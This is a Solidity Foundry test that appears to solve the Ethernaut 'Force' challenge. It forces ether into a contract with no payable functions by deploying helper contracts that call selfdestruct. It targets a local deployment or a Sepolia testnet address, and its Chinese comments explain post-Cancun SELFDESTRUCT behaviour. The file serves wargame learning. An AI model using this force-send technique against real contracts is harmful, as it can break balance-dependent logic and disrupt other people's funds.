// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

interface IForce {
    function balance() external view returns (uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract ForceExp is Test {
    IForce public contractInstance;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    uint256 sendValue = 8 wei; // Amount to send

    function setUp() public {
        // uint256   sepoliaFork = vm.createSelectFork("sepolia");
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IForce(address(new Force()));
            vm.stopPrank();
        } else if (chainId == 11155111) {
            contractInstance = IForce(payable(0x9bc49902AA3276F364fa6F9Bf5A99E18C8AfB9E7));
        } else {
            return;
        }
    }

    // forge test --mt testForceLocal -vvvv
    // forge test --mt testForceLocal --fork-url $SEPOLIA_RPC_URL -vvvvv
    function testForceLocal() public {
        console2.log("Running in testForceLocal...");

        vm.startPrank(attacker); // Set msg.sender to the attacker address

        uint256 before = address(contractInstance).balance;
        console2.log("Force balance before:", before); // Check initial balance

        // address(contractInstance).call{value: sendValue}(""); // Send 1 ether to the Force contract

        new ForceSend{value: sendValue}(payable(address(contractInstance)));

        DeleteContract deleteContract = new DeleteContract{value: sendValue}(); // Create a new contract that selfdestructs

        console2.log("DeleteContract balance before delete:", deleteContract.getBalance()); // Check the balance of the DeleteContract
        deleteContract.deleteContract(address(contractInstance)); // Call the delete function to selfdestruct and send ether to Force contract
        console2.log("DeleteContract balance after delete:", deleteContract.getBalance()); // Check the balance of the DeleteContract

        uint256 afterBalance = address(contractInstance).balance;
        console2.log("Force balance after:", afterBalance); // Check initial balance
        assertEq(afterBalance, before + sendValue + sendValue, "Balance did not increase correctly");
        vm.stopPrank();
    }
}
// 坎昆升级后删除功能只有在合约创建-自毁这两个操作处在同一笔交易时才能生效
// 其它情况 SELFDESTRUCT仅会被用来将合约中的ETH转移到指定地址

contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
// 以下合约在坎昆升级前可以完成合约的自毁，内部ETH余额的转移
// 在坎昆升级后仅能实现内部ETH余额的转移

contract DeleteContract {
    uint256 public value = 10;

    constructor() payable {}

    receive() external payable {}

    function deleteContract(address _addr) external {
        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender
        selfdestruct(payable(_addr));
    }

    function getBalance() external view returns (uint256 balance) {
        balance = address(this).balance;
    }
}
